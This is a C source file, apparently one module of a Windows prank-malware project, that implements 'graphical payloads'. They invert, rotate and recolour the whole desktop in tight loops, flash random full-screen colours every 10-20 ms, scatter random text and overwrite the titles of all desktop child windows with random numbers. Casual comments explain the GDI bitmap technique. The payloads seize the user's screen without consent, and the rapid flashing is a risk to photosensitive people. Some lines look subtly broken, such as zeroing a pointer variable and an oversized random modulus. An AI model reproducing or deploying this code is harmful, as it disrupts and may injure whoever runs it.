#include "graphicalpayloads.h"

HWND //g_hLayeredWindow = NULL,
	g_hRootWindow = NULL;

HDC //g_hLayeredWindowDC = NULL,
	g_hRootWindowDC = NULL;

RECT stScreenCords;
/*

Unused, i wanted to make some payloads which utilised the layered window

but then i had no ideas and just scrapped it lol

might update it, but won't most likely

i'll leave the code anyway lol, just commented out 

VOID WINAPI fnCreateLayeredWindow(VOID) {

	WNDCLASSEX stLayeredWindow = {0};
	
	stLayeredWindow.cbSize = sizeof(WNDCLASSEX);
	stLayeredWindow.hInstance = GetModuleHandle(NULL);
	stLayeredWindow.lpszClassName = TEXT("Schizophasia\0");
	stLayeredWindow.cbClsExtra = 0;
	stLayeredWindow.cbWndExtra = 0;
	stLayeredWindow.hbrBackground = NULL;
	stLayeredWindow.hCursor = NULL;
	stLayeredWindow.hIcon = NULL;
	stLayeredWindow.hIconSm = NULL;
	stLayeredWindow.style = 0;
	stLayeredWindow.lpszMenuName = NULL;
	stLayeredWindow.lpfnWndProc = fnWindProc;

	RegisterClassEx(&stLayeredWindow);


	g_hLayeredWindow = CreateWindowEx(
		WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
		stLayeredWindow.lpszClassName,
		stLayeredWindow.lpszClassName,
		WS_POPUP | WS_VISIBLE,
		0, 0,
		stScreenCords.right - stScreenCords.left, 
		stScreenCords.bottom - stScreenCords.top,
		NULL,
		NULL,
		stLayeredWindow.hInstance,
		NULL
		);

	if (g_hLayeredWindow == NULL) {
		MessageBoxW(
			NULL, 
			g_alpszMessageBoxTexts[0],
			g_alpszTitles[2],
			MB_OK | MB_ICONERROR);
		ExitProcess(0);
	}

	g_hLayeredWindowDC = GetDC(g_hLayeredWindow);


    SetLayeredWindowAttributes(
		g_hLayeredWindow, 
		RGB(0,0,0), 
		90, 
		LWA_ALPHA
		);
	
	MSG lpWindowMessages;
	

	while (GetMessage(
		&lpWindowMessages, 
		g_hLayeredWindow, 
		0, 0)
		) {
		TranslateMessage(&lpWindowMessages);
		DispatchMessage(&lpWindowMessages);
	}

}

LRESULT CALLBACK fnWindProc(
	_In_ HWND hWnd,
	_In_ UINT uiMessages,
	_Inout_ WPARAM pWparam,
	_In_ LPARAM lpParam
) {

	switch (uiMessages) {
	case WM_CLOSE:
		return FALSE;
	}

	return DefWindowProcW(
		hWnd, 
		uiMessages, 
		pWparam, 
		lpParam);
}
*/
BOOL CALLBACK fnEnumWindowsProc(
	_In_ HWND   hWnd,
    _In_ LPARAM lParam
) {

	LPWSTR pszRandomString[30];
	
	_itow(
		fnRNG()%16144,
		(LPWSTR)pszRandomString,
		2
	);

	SendMessageW(
		hWnd, 
		WM_SETTEXT, 
		(LPARAM)NULL, 
		(LPARAM)pszRandomString
		);
		
	return TRUE;
}

VOID WINAPI fnWindTextRandomInt(VOID) {

	while(g_iGDIPayloadCount != 7) {
		RedrawWindow(
			g_hRootWindow, 
			NULL, 
			NULL, 
			RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN
			);

		if(g_bDebug == FALSE)
			EnumChildWindows(
				g_hRootWindow, 
				fnEnumWindowsProc, 
				(LPARAM)NULL
				);

		Sleep(900);
	}

	ExitThread(EXIT_SUCCESS);
}

/*
* Most of the graphical payloads work this way
i'll explain it shortly but msdn should expain it better lol

A device independant bitmap is being create or short for DIB

They allow you to modify the colour palette and much more

We do this by providing a reference to the RGBQUAD structure as an argument of CreateDIBSection

then we can modify the intensivity of the colours 
you can use a cycle to do that ofc (as the max value you just specify the multiple of your screen width and height, to get that you use GetSystemMetrics() or GetWindowRect() where you provide the handle to your root window, which you can get via GetDesktopWindow())

this results in changing the colour palette

again you'd get a better idea how GDI works if you check the msdn page about it, i am too lazy to explain that in this file as it'd take more space than the code lmfao

*/

VOID WINAPI fnScreenRotation(VOID) {
	
	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColorPalette;
	POINT stParmPoints[3];
	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColorPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	stParmPoints[0].x = stBitmapInfo.bmiHeader.biWidth; 
	stParmPoints[0].y = 0;
	stParmPoints[1].y = 0;
	stParmPoints[1].x = 0;
	stParmPoints[2].x = stBitmapInfo.bmiHeader.biWidth; 
	stParmPoints[2].y = stBitmapInfo.bmiHeader.biHeight;

	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColorPalette, 
		NULL, 
		0
		);

	SelectObject(
		hMemoryDC, 
		hBitmap
		);
	
	while (g_iGDIPayloadCount != 1) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			NOTSRCCOPY
		);
	

		PlgBlt(
			g_hRootWindowDC,
			stParmPoints,
			hMemoryDC,
			0, 0,
			stBitmapInfo.bmiHeader.biWidth,
			stBitmapInfo.bmiHeader.biHeight,
			NULL,
			0, 0
		);

		Sleep(20);	

	} 
			DeleteObject(hBitmap);
			DeleteDC(hMemoryDC);
}


VOID WINAPI fnRandomPatternBrush(VOID) {

	while(g_iGDIPayloadCount != 4) {

		HBRUSH hBrush = CreateHatchBrush(
			fnRNG()%5, 
			RGB(fnRNG()%255, 
			fnRNG()%255, 
			fnRNG()%255)
			);
		
		FillRect(
			g_hRootWindowDC, 
			&stScreenCords, 
			hBrush
			);

		DeleteObject(hBrush);

		Sleep(20);

	} 

}

VOID WINAPI fnSolidBrushColours(VOID) {

	while (g_iGDIPayloadCount != 5) {

		HBRUSH hBrush = CreateSolidBrush(
			RGB(
				fnRNG()%255, 
				fnRNG()%255, 
				fnRNG()%255)
			);
		
		FillRect(
			g_hRootWindowDC, 
			&stScreenCords, 
			hBrush
			);

		DeleteObject(hBrush);

		Sleep(10);

	} 
}

VOID WINAPI fnDecColourPalby100(VOID) {

	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColorPalette;

	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColorPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColorPalette, 
		NULL, 
		0
		);

	SelectObject(hMemoryDC, hBitmap);
	
	while (g_iGDIPayloadCount != 2) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			SRCCOPY
		);

		for(INT iA = 0; iA<iRgbqMem; iA++) {
			pColorPalette[iA].rgbRed-=100;
			pColorPalette[iA].rgbGreen-=100;
			pColorPalette[iA].rgbBlue-=100;
		}

		BitBlt(
			g_hRootWindowDC, 
			fnRNG()%2,
			fnRNG()%2,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			hMemoryDC, 
			0, 
			0,
			SRCCOPY
		);

		Sleep(20);	

		} 
			DeleteObject(hBitmap);
			DeleteDC(hMemoryDC);	
	} 

VOID WINAPI fnIncrementColourPalStatic(VOID) {

	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColorPalette;

	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColorPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColorPalette, 
		NULL, 
		0
		);

	SelectObject(
		hMemoryDC, 
		hBitmap
		);
	
	while (g_iGDIPayloadCount != 6) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			SRCCOPY
		);

		for(INT iA = 0; iA<iRgbqMem; iA++) {
			pColorPalette[iA].rgbRed++;
			pColorPalette[iA].rgbGreen=fnRNG()%255;
			pColorPalette[iA].rgbBlue++;
		}

		BitBlt(
			g_hRootWindowDC,
			0, 
			0,
			stBitmapInfo.bmiHeader.biWidth,
			stBitmapInfo.bmiHeader.biHeight,
			hMemoryDC,
			0, 
			0,
			SRCCOPY
		);

	Sleep(10);	

	
	} 
		DeleteObject(hBitmap);
		DeleteDC(hMemoryDC);	
		
}

VOID WINAPI fnIncrementColourPal(VOID) {
	
	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColorPalette;

	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColorPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColorPalette, 
		NULL, 
		0
		);

	SelectObject(
		hMemoryDC, 
		hBitmap
		);
	
	while (g_iGDIPayloadCount != 3) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			SRCCOPY
		);

		for(INT iA = 0; iA<iRgbqMem; iA++) {
			pColorPalette[iA].rgbRed++;
			pColorPalette[iA].rgbGreen++;
			pColorPalette[iA].rgbBlue++;
		}

		BitBlt(
			g_hRootWindowDC,
			0, 
			0,
			stBitmapInfo.bmiHeader.biWidth,
			stBitmapInfo.bmiHeader.biHeight,
			hMemoryDC,
			0, 
			0,
			SRCCOPY
		);

	Sleep(10);	
		
	}
			DeleteObject(hBitmap);
			DeleteDC(hMemoryDC);
}

VOID WINAPI fnCaptchaText(VOID) {

	while(g_iGDIPayloadCount != 7) {

		LPWSTR pszRandomString[13];
	
	_itow(
		fnRNG()%4096,
		(LPWSTR)pszRandomString,
		16
	);

		HFONT hFont = CreateFontW(
			50,
			-MulDiv((stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top), GetDeviceCaps(g_hRootWindowDC, LOGPIXELSY), 72),
			fnRNG()%4564545645645,
			0,
			FW_BOLD,
			FALSE,
			FALSE,
			FALSE,
			ANSI_CHARSET,
			OUT_CHARACTER_PRECIS,
			CLIP_CHARACTER_PRECIS,
			NONANTIALIASED_QUALITY,
			FF_DECORATIVE,
			NULL
		);

		SelectObject(
			g_hRootWindowDC, 
			hFont
		);

		TextOutW(
			g_hRootWindowDC, 
			fnRNG()%(stScreenCords.right - stScreenCords.left),
			fnRNG()%(stScreenCords.bottom - stScreenCords.top),
			(LPWSTR)pszRandomString,
			lstrlenW((LPWSTR)pszRandomString)
			);

			DeleteObject(hFont);
			Sleep(5);
	}
}